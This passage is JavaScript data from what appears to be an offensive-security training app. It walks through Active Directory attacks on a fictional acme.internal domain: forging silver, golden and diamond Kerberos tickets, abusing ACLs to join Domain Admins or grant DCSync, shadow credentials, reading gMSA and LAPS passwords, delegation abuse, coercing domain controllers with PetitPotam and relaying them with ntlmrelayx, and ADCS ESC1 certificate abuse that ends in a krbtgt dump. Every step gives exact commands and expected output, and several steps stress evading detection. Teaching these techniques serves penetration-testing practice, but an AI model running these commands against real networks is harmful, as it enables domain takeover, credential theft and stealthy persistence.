      {"t":"Gather the three inputs","d":"You need the service NT hash, the domain SID, and the account's own SPN.","demo":[{"run":"impacket-lookupsid acme.internal/jbloggs:'Autumn2026!'@10.10.10.10 | grep 'Domain SID'","out":"[*] Domain SID is: S-1-5-21-1127051588-2557081730-3523236190","sig":"Domain SID is: S-1-5-21"}],"note":"That SID, the svc_sql hash, and svc_sql's SPN (MSSQLSvc/sql01.acme.internal) are the ticket inputs."},
      {"t":"Forge the service ticket","d":"ticketer forges a TGS for svc_sql's own SPN as Administrator, offline, with no DC contact.","demo":[{"run":"impacket-ticketer -nthash a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 -domain-sid S-1-5-21-1127051588-2557081730-3523236190 -domain acme.internal -spn MSSQLSvc/sql01.acme.internal administrator","out":"[*] Saving ticket in administrator.ccache","sig":"Saving ticket in administrator.ccache"}],"note":"A forged MSSQL ticket for sql01 as Administrator; the SPN must be one svc_sql owns, with no DC touched."},
      {"t":"Use the ticket","d":"Export it and hit the exact service you forged it for, here MSSQL as sysadmin.","demo":[{"run":"export KRB5CCNAME=administrator.ccache && impacket-mssqlclient -k -no-pass administrator@sql01.acme.internal","out":"[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\nSQL (ACME\\administrator  dbo@master)>","sig":"SQL (ACME\\administrator"}],"note":"Admin on the MSSQL service via a forged ticket; enable xp_cmdshell from here for a shell."}]},
    "golden-ticket": {"lead":"With krbtgt, the domain SID, and a username, forge a TGT as any user with any groups.","items":[
      {"t":"Get the domain SID","d":"The forged ticket needs the domain SID.","demo":[{"run":"impacket-lookupsid acme.internal/svc_backup@10.10.10.10 | grep 'Domain SID'","out":"[*] Domain SID is: S-1-5-21-1127051588-2557081730-3523236190","sig":"Domain SID is: S-1-5-21"}],"note":"That SID plus the krbtgt hash are the forging inputs."},
      {"t":"Forge the TGT","d":"ticketer forges a golden TGT for Administrator with default Domain Admin groups.","demo":[{"run":"impacket-ticketer -nthash 1a59bd44e5e3b0f0a1c2d3e4f5a6b7c8 -domain-sid S-1-5-21-1127051588-2557081730-3523236190 -domain acme.internal administrator","out":"[*] Saving ticket in administrator.ccache","sig":"Saving ticket in administrator.ccache"}],"note":"A forged TGT good for any service as Administrator."},
      {"t":"Use it for durable access","d":"Export the ticket and it keeps working through password resets.","demo":[{"run":"export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass administrator@dc01.acme.internal","out":"[*] Found writable share ADMIN$\nC:\\Windows\\system32>","sig":"C:\\Windows\\system32>"}],"note":"It survives everyone's reset except krbtgt's, which is almost never rotated."}]},
    "diamond-ticket": {"lead":"Request a legitimate TGT, then use the krbtgt key to re-stamp its PAC with the privileges you want.","items":[
      {"t":"Request a real TGT first","d":"You need a genuine DC-issued ticket as the base to modify.","demo":[{"run":"impacket-getTGT acme.internal/jbloggs:'Autumn2026!'","out":"[*] Saving ticket in jbloggs.ccache","sig":"Saving ticket in jbloggs.ccache"}],"note":"This real TGT is the base the diamond ticket modifies."},
      {"t":"Re-stamp the PAC with Rubeus","d":"Rubeus diamond edits the PAC of the real ticket using the krbtgt key.","demo":[{"run":"Rubeus.exe diamond /krbkey:1a59bd44e5e3b0f0a1c2d3e4f5a6b7c8 /user:jbloggs /password:Autumn2026! /ticketuser:administrator /ticketuserid:500 /groups:512","out":"[+] Ticket successfully imported!","sig":"Ticket successfully imported!"}],"note":"The PAC now claims Administrator (RID 500) and Domain Admins (512) on a real ticket."},
      {"t":"Blend in","d":"Because it started as a genuine ticket, its fields are consistent and evade golden-ticket detections.","demo":[{"run":"klist","out":"Server: krbtgt/ACME.INTERNAL @ ACME.INTERNAL\nClient: administrator @ ACME.INTERNAL","sig":"administrator @ ACME.INTERNAL"}],"note":"Same effect as a golden ticket, but far harder to spot."}]}
  };
  Object.keys(AD2_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = AD2_HOW[k]; });

  var AD2_PRACTICE = {
    "asrep-roast": {situation:"You have a confirmed user list and no credentials. What is the pure-upside attack to try?", choices:["asrep-roast","kerberoast","password-spray","dcsync"], coach:{"kerberoast":"That needs a domain credential you do not have yet; AS-REP roasting needs only a username.","password-spray":"Worth trying too, but it risks lockouts; AS-REP roasting is lossless, you only ask the KDC.","dcsync":"Far out of reach: that needs Domain Admin or replication rights, and you are starting from a bare user list."}},
    "crack-asrep": {situation:"A $krb5asrep$ hash is sitting in asrep.hash. How do you turn it into a usable credential?", choices:["crack-asrep","asrep-roast","kerberoast","bloodhound-collect"], coach:{"asrep-roast":"Already done, that produced the hash; now crack it offline.","kerberoast":"A different hash type ($krb5tgs$, mode 13100) and it needs a credential; this one is mode 18200.","bloodhound-collect":"Needs a credential first; cracking this hash is how you get one."}},
    "kerberoast": {situation:"You hold a low-priv domain credential and want a shot at a higher-priv account's password. What is the standard move?", choices:["kerberoast","asrep-roast","password-spray","dcsync"], coach:{"asrep-roast":"That is credential-free and only hits pre-auth-disabled accounts; with a credential, roast every SPN instead.","password-spray":"You already have one credential; roast service accounts rather than guessing for more.","dcsync":"Needs replication rights you do not have yet; cracking a service account may get you closer."}},
    "crack-tgs": {situation:"A $krb5tgs$ hash is in tgs.hash. How do you turn it into a credential, and what should you check next?", choices:["crack-tgs","crack-asrep","kerberoast","dcsync"], coach:{"crack-asrep":"That is for $krb5asrep$ (mode 18200); a TGS hash is mode 13100.","kerberoast":"Already done, that produced this ticket; now crack it offline.","dcsync":"Needs replication rights; the cracked account might be over-privileged enough to have them, so check."}},
    "password-spray": {situation:"You have a 24-name user list, no password, and the lockout threshold is 5. How do you safely look for a weak credential?", choices:["password-spray","kerberoast","asrep-roast","ad-user-enum"], coach:{"kerberoast":"Needs a credential you do not have yet; a careful spray of one seasonal password may get you one.","asrep-roast":"Worth trying too and needs no creds, but it only hits pre-auth-disabled accounts; spraying covers everyone under the lockout limit.","ad-user-enum":"Already done, that built the list; now try one careful password against it."}},
    "gpp-passwords": {situation:"You have a low-priv domain user and can read SYSVOL. What free credential is worth checking for first?", choices:["gpp-passwords","kerberoast","smb-share-inventory","asrep-roast"], coach:{"kerberoast":"Worth doing too, but GPP is a direct cleartext credential in a world-readable share, so check it first.","smb-share-inventory":"The broader loot hunt; GPP is the specific, high-yield SYSVOL check within it.","asrep-roast":"Credential-free and unrelated; the GPP read uses your creds but pays out a local-admin password."}},
    "smb-share-inventory": {situation:"You just got a domain credential and want the fastest route to loot like passwords left in files. What do you do?", choices:["smb-share-inventory","bloodhound-collect","kerberoast","gpp-passwords"], coach:{"bloodhound-collect":"Maps ACL paths, not file loot; a password sitting in a share is often faster than any graph path.","kerberoast":"A credential attack, not a loot hunt; shares frequently hold a plaintext password already.","gpp-passwords":"A specific SYSVOL check within the broader share hunt; inventory all readable shares too."}},
    "kerberos-tickets": {situation:"impacket fails with KRB_AP_ERR_SKEW against the DC. What is actually wrong?", choices:["kerberos-tickets","ticket-reuse","lateral-exec","dcsync"], coach:{"ticket-reuse":"That is how you use a ticket once auth works; the SKEW error is a clock problem, not a reuse problem.","lateral-exec":"The tool is fine; your clock is more than five minutes off the DC.","dcsync":"Blocked by the same skew; fix the clock first, then any Kerberos action works."}},
    "silver-ticket": {situation:"You dumped the svc_sql service account's NT hash and want admin on just its MSSQL service, quietly and without touching the DC. What do you forge?", choices:["silver-ticket","golden-ticket","ticket-reuse","dcsync"], coach:{"golden-ticket":"That needs the krbtgt hash and gives domain-wide power; a silver ticket needs only this service hash and stays scoped and quiet.","ticket-reuse":"That reuses an existing ticket; here you forge a new one from the hash.","dcsync":"Needs replication rights; a silver ticket needs only the service hash you already hold."}},
    "golden-ticket": {situation:"You own the domain and want access that survives a mass password reset. What do you forge, and with what?", choices:["golden-ticket","silver-ticket","diamond-ticket","dcsync"], coach:{"silver-ticket":"Scoped to one service and no krbtgt needed; a golden ticket with the krbtgt hash gives domain-wide, reset-proof access.","diamond-ticket":"A stealthier variant of the same krbtgt-based idea; the plain golden ticket is the baseline persistence tool.","dcsync":"That is how you got krbtgt; the golden ticket is what you forge with it to persist."}},
    "diamond-ticket": {situation:"You own the domain but a plain golden ticket keeps tripping ticket-anomaly detection. What is the stealthier option?", choices:["diamond-ticket","golden-ticket","silver-ticket","dump-secrets"], coach:{"golden-ticket":"That is the noisy one you are trying to avoid; a diamond ticket edits a real TGT so its fields stay consistent.","silver-ticket":"Scoped to one service and no krbtgt needed, but not about TGT stealth; the diamond ticket is the evasive TGT.","dump-secrets":"That is how you got krbtgt; the diamond ticket is the stealthy way to wield it."}}
  };
  Object.keys(AD2_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = AD2_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });

  // === AD LANE : batch 3 (ACL & Object Abuse, Delegation & Coercion, ADCS) =======================
  var AD3_LEADUPS = {
    "ad-acl-abuse": [
      { key: "edge", label: "BloodHound shows an ACL you hold", steps: [
        { title: "A dangerous right over a useful object", tool: "bloodhound", where: "local", cmd: "# BloodHound edge: jbloggs -[GenericAll]-> Helpdesk Admins", out: "jbloggs  GenericAll  Helpdesk Admins (group)", sig: "GenericAll  Helpdesk Admins", teach: "You hold GenericAll over a group, which means you can add yourself to it." } ] },
    ],
    "bloodyad-acl": [
      { key: "edge", label: "An ACL edge found from Linux", steps: [
        { title: "You found a writable object", tool: "bloodyAD", where: "local", cmd: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' get writable", out: "svc_backup (GenericAll)", sig: "svc_backup (GenericAll)", teach: "You hold GenericAll over svc_backup from Linux; bloodyAD abuses it with no RSAT." } ] },
    ],
    "shadow-credentials": [
      { key: "write", label: "You hold GenericWrite over an object", steps: [
        { title: "GenericWrite over a target object", tool: "bloodyAD", where: "local", cmd: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' get writable", out: "svc_app (GenericWrite)", sig: "svc_app (GenericWrite)", teach: "GenericWrite plus ADCS in the environment means you can add a key and authenticate as svc_app, no reset." } ] },
    ],
    "gmsa-read": [
      { key: "readright", label: "You can read a gMSA's password", steps: [
        { title: "You are allowed to read a gMSA", tool: "bloodhound", where: "local", cmd: "# BloodHound edge: Helpdesk -[ReadGMSAPassword]-> svc_gmsa$", out: "Helpdesk  ReadGMSAPassword  svc_gmsa$", sig: "ReadGMSAPassword  svc_gmsa$", teach: "Your group can read svc_gmsa$'s managed password, so you recover the NT hash with no cracking." } ] },
    ],
    "laps-read": [
      { key: "readright", label: "You can read a machine's LAPS password", steps: [
        { title: "LAPS read rights over a host", tool: "bloodhound", where: "local", cmd: "# BloodHound edge: Workstation Admins -[ReadLAPSPassword]-> WS01", out: "Workstation Admins  ReadLAPSPassword  WS01", sig: "ReadLAPSPassword  WS01", teach: "Your group can read WS01's LAPS password, which is its local Administrator in cleartext." } ] },
    ],
    "delegation-abuse": [
      { key: "flag", label: "Enumeration flags a delegation setting", steps: [
        { title: "A delegation setting turned up", tool: "nxc", where: "local", cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --trusted-for-delegation", out: "LDAP  10.10.10.10  389  DC01  WEB01$ (TRUSTED_FOR_DELEGATION)", sig: "TRUSTED_FOR_DELEGATION", teach: "The variant decides the play; first identify whether it is unconstrained, constrained, or RBCD." } ] },
    ],
    "unconstrained-delegation": [
      { key: "own", label: "You own an unconstrained host", steps: [
        { title: "You have admin on an unconstrained host", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.20 -u svc_web -p 'WebP@ss1' --local-auth", out: "SMB  10.10.10.20  445  WEB01  [+] WEB01\\svc_web (Pwn3d!)", sig: "(Pwn3d!)", teach: "You admin WEB01, which is trusted for unconstrained delegation; now coerce the DC to it." } ] },
    ],
    "getst-impersonation": [
      { key: "rbcd", label: "You hold or rigged delegation rights", steps: [
        { title: "An account can delegate, or you set up RBCD", tool: "impacket", where: "local", cmd: "impacket-rbcd -delegate-to WEB01$ -delegate-from OBOL$ -action write acme.internal/jbloggs:'Autumn2026!'", out: "[*] Delegation rights modified successfully!", sig: "Delegation rights modified successfully!", teach: "OBOL$ can now act for users on WEB01; getST mints the impersonation ticket." } ] },
    ],
    "coerce-auth": [
      { key: "relay", label: "A relay or capture is staged", steps: [
        { title: "Your catcher is set up", tool: "ntlmrelayx", where: "local", cmd: "impacket-ntlmrelayx -t ldaps://10.10.10.10 --delegate-access", out: "[*] Servers started, waiting for connections", sig: "waiting for connections", teach: "With the relay waiting, coerce the DC to authenticate so it arrives at your catcher." } ] },
    ],
    "adcs-esc": [
      { key: "ca", label: "You have a credential and a CA exists", steps: [
        { title: "A domain credential and a CA", tool: "certipy", where: "local", cmd: "certipy find -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -stdout | grep 'CA Name'", out: "CA Name : acme-DC01-CA", sig: "CA Name : acme-DC01-CA", teach: "There is a CA; check its templates for an ESC you can abuse." } ] },
    ],
    "cert-authenticate": [
      { key: "pfx", label: "You hold a certificate for a principal", steps: [
        { title: "You minted or stole a PFX", tool: "certipy", where: "local", cmd: "ls -la administrator.pfx", out: "-rw-r--r-- 1 kali kali 2600 administrator.pfx", sig: "administrator.pfx", teach: "A PFX for a principal authenticates as them via PKINIT; convert it to a TGT and NT hash." } ] },
    ]
  };
  Object.keys(AD3_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = AD3_LEADUPS[k]; });

  var AD3_HOW = {
    "ad-acl-abuse": {"lead":"Match the right to its one action: GenericAll on a group means join it, ForceChangePassword means reset a user, WriteDacl means grant yourself DCSync.","items":[
      {"t":"Add yourself to a group (GenericAll)","d":"GenericAll over a group lets you add your own account with plain net.exe.","demo":[{"run":"net group \"Helpdesk Admins\" jbloggs /add /domain","out":"The command completed successfully.","sig":"completed successfully"}],"note":"You are in Helpdesk Admins now; re-check what that group can reach."},
      {"t":"Reset a user (ForceChangePassword)","d":"ForceChangePassword over a user lets you set a new password without the old one.","demo":[{"run":"net rpc password svc_adm 'NewP@ss123!' -U acme.internal/jbloggs%'Autumn2026!' -S 10.10.10.10","out":"(no output; the password was set)","sig":"(no output"}],"note":"svc_adm now has a password you know; log in as it next."},
      {"t":"Grant yourself DCSync (WriteDacl)","d":"WriteDacl on the domain object lets you add replication rights to your own account.","demo":[{"run":"impacket-dacledit -action write -rights DCSync -principal jbloggs -target-dn 'DC=acme,DC=internal' acme.internal/jbloggs:'Autumn2026!'","out":"[*] DACL modified successfully! jbloggs now has GetChanges/GetChangesAll","sig":"now has GetChanges/GetChangesAll"}],"note":"You granted yourself replication rights; DCSync is now available."}]},
    "bloodyad-acl": {"lead":"bloodyAD runs the abuse from Linux: reset a password, add a group member, seize ownership, or grant DCSync.","items":[
      {"t":"Reset a user's password","d":"set password writes a new password on an object you control.","demo":[{"run":"bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' set password svc_backup 'NewP@ss123!'","out":"[+] Password changed successfully!","sig":"Password changed successfully!"}],"note":"svc_backup:NewP@ss123! is yours now; it may hold replication rights."},
      {"t":"Add a group member","d":"add groupMember joins a target to a group you can write.","demo":[{"run":"bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' add groupMember 'Domain Admins' jbloggs","out":"[+] jbloggs added to Domain Admins","sig":"added to Domain Admins"}],"note":"If you could write that group, you are a Domain Admin now."},
      {"t":"Seize ownership then grant rights","d":"set owner takes ownership of an object, which then lets you add a DCSync grant.","demo":[{"run":"bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' set owner 'DC=acme,DC=internal' jbloggs","out":"[+] Owner changed to jbloggs","sig":"Owner changed to jbloggs"}],"note":"Owning the domain object lets you grant yourself replication rights for DCSync."}]},
    "shadow-credentials": {"lead":"Add a key to msDS-KeyCredentialLink, then authenticate as the object via PKINIT, quieter than a reset.","items":[
      {"t":"Add the shadow key","d":"pywhisker adds your certificate key to the target's msDS-KeyCredentialLink.","demo":[{"run":"pywhisker.py -d acme.internal -u jbloggs -p 'Autumn2026!' --target svc_app --action add","out":"[+] KeyCredential added. Saved PFX to svc_app.pfx (password: aB3xK9...)","sig":"KeyCredential added"}],"note":"svc_app.pfx now authenticates as svc_app; take it to certipy next."},
      {"t":"Authenticate with the PFX","d":"certipy auth uses the PFX over PKINIT to get a TGT and the NT hash.","demo":[{"run":"certipy auth -pfx svc_app.pfx -dc-ip 10.10.10.10","out":"[*] Got TGT\n[*] Got hash for 'svc_app@acme.internal': aad3b435b51404eeaad3b435b51404ee:5f2c8e1a9b3d4f607a8c1e2b3d4f5a6b","sig":"Got hash for 'svc_app"}],"note":"You hold svc_app's NT hash without ever resetting its password."},
      {"t":"Clean up the key","d":"Remove the shadow key afterward so the attribute looks untouched.","demo":[{"run":"pywhisker.py -d acme.internal -u jbloggs -p 'Autumn2026!' --target svc_app --action remove --device-id 9c2f1b7a","out":"[+] KeyCredential removed","sig":"KeyCredential removed"}],"note":"The target's msDS-KeyCredentialLink is back to normal, stealthier than a lingering reset."}]},
    "gmsa-read": {"lead":"Read the managed-password blob; tools compute the NT hash from it directly, with no cracking.","items":[
      {"t":"Read with bloodyAD","d":"get object --attr msDS-ManagedPassword returns the NT hash when you are allowed.","demo":[{"run":"bloodyAD --host 10.10.10.10 -d acme.internal -u jbloggs -p 'Autumn2026!' get object 'svc_gmsa$' --attr msDS-ManagedPassword","out":"msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:6d0b2e4f8a1c3d5e7f9a0b1c2d3e4f50","sig":"6d0b2e4f8a1c3d5e7f9a0b1c2d3e4f50"}],"note":"That NT hash is svc_gmsa$'s current password; pass it straight away."},
      {"t":"Or read with nxc","d":"nxc's gmsa module does the same read over LDAP.","demo":[{"run":"nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --gmsa","out":"LDAP  10.10.10.10  389  DC01  Account: svc_gmsa$  NTLM: 6d0b2e4f8a1c3d5e7f9a0b1c2d3e4f50","sig":"svc_gmsa$  NTLM"}],"note":"Same hash; use whichever tool is handy."},
      {"t":"Pass the hash","d":"gMSAs are often over-privileged, so find where this one is admin.","demo":[{"run":"nxc smb 10.10.10.0/24 -u 'svc_gmsa$' -H 6d0b2e4f8a1c3d5e7f9a0b1c2d3e4f50","out":"SMB  10.10.10.10  445  DC01  [+] acme.internal\\svc_gmsa$ (Pwn3d!)","sig":"(Pwn3d!)"}],"note":"Pwn3d! on the DC, a big jump from reading one attribute."}]},
    "laps-read": {"lead":"Read the LAPS attribute; it is the host's local Administrator password in cleartext, and often reused.","items":[
      {"t":"Read with nxc","d":"The laps module reads the LAPS attribute for machines you may read.","demo":[{"run":"nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M laps","out":"LAPS  WS01  Administrator:Summer!Laps#2026","sig":"Administrator:Summer!Laps#2026"}],"note":"That is WS01's local admin password in cleartext."},
      {"t":"Or query the attribute directly","d":"bloodyAD reads ms-Mcs-AdmPwd when the newer msLAPS-Password is not in use.","demo":[{"run":"bloodyAD --host 10.10.10.10 -d acme.internal -u jbloggs -p 'Autumn2026!' get object WS01$ --attr ms-Mcs-AdmPwd","out":"ms-Mcs-AdmPwd: Summer!Laps#2026","sig":"Summer!Laps#2026"}],"note":"Same cleartext password; use the attribute the environment actually populates."},
      {"t":"Log in as local admin","d":"Use the LAPS password with --local-auth to land on the host.","demo":[{"run":"nxc smb 10.10.10.21 -u Administrator -p 'Summer!Laps#2026' --local-auth","out":"SMB  10.10.10.21  445  WS01  [+] WS01\\Administrator (Pwn3d!)","sig":"(Pwn3d!)"}],"note":"Local admin on WS01; dump its secrets or pivot from here."}]},
    "delegation-abuse": {"lead":"Identify the delegation type, then pick the matching abuse; the three types each have their own play.","items":[
      {"t":"Find unconstrained hosts","d":"A computer flagged TRUSTED_FOR_DELEGATION caches TGTs, which is the unconstrained branch.","demo":[{"run":"nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --trusted-for-delegation","out":"LDAP  10.10.10.10  389  DC01  WEB01$ (TRUSTED_FOR_DELEGATION)","sig":"TRUSTED_FOR_DELEGATION"}],"note":"WEB01 is unconstrained; own it, coerce the DC, capture its TGT."},
      {"t":"Find constrained delegation","d":"msDS-AllowedToDelegateTo lists the services an account may delegate to.","demo":[{"run":"nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --query \"(msds-allowedtodelegateto=*)\" \"sAMAccountName msds-allowedtodelegateto\"","out":"sAMAccountName: svc_web\nmsDS-AllowedToDelegateTo: cifs/file01.acme.internal","sig":"cifs/file01.acme.internal"}],"note":"svc_web can delegate to cifs/file01; getST then impersonates anyone to that service."},
      {"t":"Set up RBCD if you can write","d":"Writing msDS-AllowedToActOnBehalfOfOtherIdentity on a computer grants you delegation to it.","demo":[{"run":"impacket-rbcd -delegate-to WEB01$ -delegate-from OBOL$ -action write acme.internal/jbloggs:'Autumn2026!'","out":"[*] Delegation rights modified successfully!\n[*] OBOL$ can now impersonate users on WEB01$","sig":"can now impersonate users on WEB01$"}],"note":"You rigged RBCD; getST then mints a ticket as Administrator to WEB01."}]},
    "unconstrained-delegation": {"lead":"Monitor the host for TGTs, coerce the DC to authenticate to it, then reuse its captured TGT.","items":[
      {"t":"Monitor for incoming TGTs","d":"Rubeus monitor watches for tickets cached by the unconstrained host.","demo":[{"run":"Rubeus.exe monitor /interval:5 /nowrap","out":"[*] Monitoring every 5 seconds for new TGTs\n[*] Listening...","sig":"Monitoring every 5 seconds"}],"note":"Leave it running, then trigger the DC to authenticate."},
      {"t":"Coerce the DC","d":"PetitPotam forces DC01 to authenticate to your unconstrained host.","demo":[{"run":"python3 PetitPotam.py -u jbloggs -p 'Autumn2026!' -d acme.internal WEB01 DC01","out":"[+] Triggered coercion; DC01$ authenticating to WEB01","sig":"DC01$ authenticating to WEB01"}],"note":"The DC's TGT will land in your monitor."},
      {"t":"Capture and reuse the DC TGT","d":"The monitor prints DC01$'s TGT; reuse it to DCSync.","demo":[{"run":"Rubeus.exe monitor /interval:5","out":"[+] Captured TGT for DC01$@ACME.INTERNAL\n  doIFujCCBbagAwIBBaE...","sig":"Captured TGT for DC01$"}],"note":"A DC machine TGT is effectively the domain; use it to DCSync."}]},
    "getst-impersonation": {"lead":"Run S4U with getST to request a service ticket as any user, then use it against the target service.","items":[
      {"t":"Impersonate Administrator","d":"getST -impersonate requests a ticket for cifs/web01 as Administrator via S4U.","demo":[{"run":"impacket-getST -spn cifs/web01.acme.internal -impersonate administrator 'acme.internal/OBOL$:MachinePass123!'","out":"[*] Requesting S4U2self\n[*] Requesting S4U2proxy\n[*] Saving ticket in administrator@cifs_web01.ccache","sig":"Saving ticket in administrator@cifs_web01.ccache"}],"note":"A CIFS ticket for WEB01 as Administrator; export and use it."},
      {"t":"Use the ticket","d":"Export KRB5CCNAME and run a -k tool against the exact SPN.","demo":[{"run":"export KRB5CCNAME=administrator@cifs_web01.ccache && impacket-psexec -k -no-pass administrator@web01.acme.internal","out":"[*] Found writable share ADMIN$\nC:\\Windows\\system32>","sig":"C:\\Windows\\system32>"}],"note":"SYSTEM on WEB01 as Administrator via the impersonation ticket."},
      {"t":"Constrained-delegation variant","d":"When an account already has msDS-AllowedToDelegateTo, use its creds directly in getST.","demo":[{"run":"impacket-getST -spn cifs/file01.acme.internal -impersonate administrator 'acme.internal/svc_web:WebP@ss1'","out":"[*] Saving ticket in administrator@cifs_file01.ccache","sig":"administrator@cifs_file01.ccache"}],"note":"Same S4U exchange from a constrained-delegation account instead of RBCD."}]},
    "coerce-auth": {"lead":"Trigger the DC's authentication to your host; the relay or delegation host then consumes it.","items":[
      {"t":"Coerce with PetitPotam (MS-EFSR)","d":"PetitPotam forces the DC to authenticate over the EFS RPC interface.","demo":[{"run":"python3 PetitPotam.py -u jbloggs -p 'Autumn2026!' -d acme.internal 10.10.14.5 10.10.10.10","out":"[+] Attack worked! DC01$ authenticated to 10.10.14.5","sig":"Attack worked!"}],"note":"The DC's auth landed at your relay; check ntlmrelayx for the result."},
      {"t":"Fall back to PrinterBug or DFSCoerce","d":"If EFSR is patched, MS-RPRN or MS-DFSNM often still fires.","demo":[{"run":"coercer coerce -t 10.10.10.10 -l 10.10.14.5 -u jbloggs -p 'Autumn2026!' -d acme.internal","out":"[+] MS-RPRN  RpcRemoteFindFirstPrinterChangeNotification  SUCCESS\n[+] DC01$ authenticating to 10.10.14.5","sig":"DC01$ authenticating to 10.10.14.5"}],"note":"coercer tries every method; one usually fires even on a partly patched DC."},
      {"t":"Confirm the relay caught it","d":"ntlmrelayx shows the relayed authentication acting on the target.","demo":[{"run":"# ntlmrelayx console after the coercion fires","out":"[*] Authenticating against ldaps://10.10.10.10 as ACME/DC01$ SUCCEED\n[*] Delegation rights added for OBOL$","sig":"Delegation rights added for OBOL$"}],"note":"The coerced DC auth was relayed to LDAP and set up RBCD; now impersonate with getST."}]},
    "adcs-esc": {"lead":"certipy find -vulnerable names the ESC; then abuse the matching misconfiguration to mint a cert.","items":[
      {"t":"Find vulnerable templates","d":"certipy find -vulnerable lists each template and the ESC it is vulnerable to.","demo":[{"run":"certipy find -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -vulnerable","out":"[!] Vulnerable Certificate Templates\n  Template: UserCert\n    [!] ESC1 : Enrollee supplies subject and has client-auth EKU","sig":"ESC1"}],"note":"ESC1 means you can request a cert for any user by supplying the SAN."},
      {"t":"Abuse ESC1 for a cert as admin","d":"req with -upn administrator asks the CA for a cert in Administrator's name.","demo":[{"run":"certipy req -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -ca acme-DC01-CA -template UserCert -upn administrator@acme.internal","out":"[*] Saving certificate and private key to 'administrator.pfx'","sig":"administrator.pfx"}],"note":"A certificate that authenticates as Administrator; take it to cert-authenticate."},
      {"t":"Recognise ESC8 for a relay","d":"ESC8 is a web-enrollment endpoint you relay coerced auth to, paired with coercion.","demo":[{"run":"certipy find -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -vulnerable -stdout | grep ESC8","out":"    [!] ESC8 : Web Enrollment (HTTP) enabled, relay target","sig":"ESC8"}],"note":"ESC8 pairs with coercion: relay the DC's auth to the CA web endpoint for a DC cert."}]},
    "cert-authenticate": {"lead":"certipy auth uses the PFX over PKINIT for a TGT, and UnPAC-the-hash returns the account's NT hash.","items":[
      {"t":"Authenticate with the cert","d":"certipy auth performs PKINIT, saves a TGT, and prints the NT hash too.","demo":[{"run":"certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10","out":"[*] Using principal: administrator@acme.internal\n[*] Got TGT\n[*] Got hash for 'administrator@acme.internal': aad3b435b51404eeaad3b435b51404ee:2b9c0d1e3f4a5b6c7d8e9f0a1b2c3d4e","sig":"Got hash for 'administrator@acme.internal'"}],"note":"You hold Administrator's TGT and NT hash, both from a certificate."},
      {"t":"Use the NT hash","d":"Pass the recovered hash straight into a login.","demo":[{"run":"nxc smb 10.10.10.10 -u administrator -H 2b9c0d1e3f4a5b6c7d8e9f0a1b2c3d4e","out":"SMB  10.10.10.10  445  DC01  [+] acme.internal\\administrator (Pwn3d!)","sig":"(Pwn3d!)"}],"note":"Administrator on the DC via the certificate path."},
      {"t":"Or use the TGT for DCSync","d":"Export the ccache and run -k tools with no password.","demo":[{"run":"export KRB5CCNAME=administrator.ccache && impacket-secretsdump -k -no-pass dc01.acme.internal -just-dc-user krbtgt","out":"krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44e5e3b0f0a1c2d3e4f5a6b7c8:::","sig":"krbtgt:502:"}],"note":"The TGT drives DCSync; the certificate path led straight to the krbtgt hash."}]}
  };
  Object.keys(AD3_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = AD3_HOW[k]; });

  var AD3_PRACTICE = {
    "ad-acl-abuse": {situation:"BloodHound shows your user has GenericAll over the 'Helpdesk Admins' group. What does that let you do?", choices:["ad-acl-abuse","dcsync","kerberoast","shadow-credentials"], coach:{"dcsync":"Only if that group grants replication rights; first use GenericAll to add yourself, then see what the group reaches.","kerberoast":"Unrelated to this edge; GenericAll over a group simply means add yourself to it.","shadow-credentials":"That abuses GenericWrite over a computer or user object, not GenericAll over a group; here you just join the group."}},
    "bloodyad-acl": {situation:"From Kali you confirmed GenericAll over svc_backup and have no Windows foothold. How do you abuse it?", choices:["bloodyad-acl","ad-acl-abuse","powerview-enum","lateral-exec"], coach:{"ad-acl-abuse":"That uses net.exe or PowerView from a Windows foothold; you are on Linux, so bloodyAD is the remote equivalent.","powerview-enum":"That is recon from a Windows box; you already found the edge and are on Linux, so act on it with bloodyAD.","lateral-exec":"You do not have svc_backup's creds yet; bloodyAD resets its password first, then you can use them."}},
    "shadow-credentials": {situation:"You hold GenericWrite over a computer object and the domain runs ADCS. You want access as that object without the owner noticing a password change. What do you do?", choices:["shadow-credentials","ad-acl-abuse","dcsync","kerberoast"], coach:{"ad-acl-abuse":"ForceChangePassword would work but resets the password (noticed, breaks logins); shadow credentials add a key instead, quietly.","dcsync":"Needs replication rights you do not have; shadow credentials turn this write into authentication as the object.","kerberoast":"That targets SPN accounts for offline cracking; here you have write access, so add a key and authenticate directly."}},
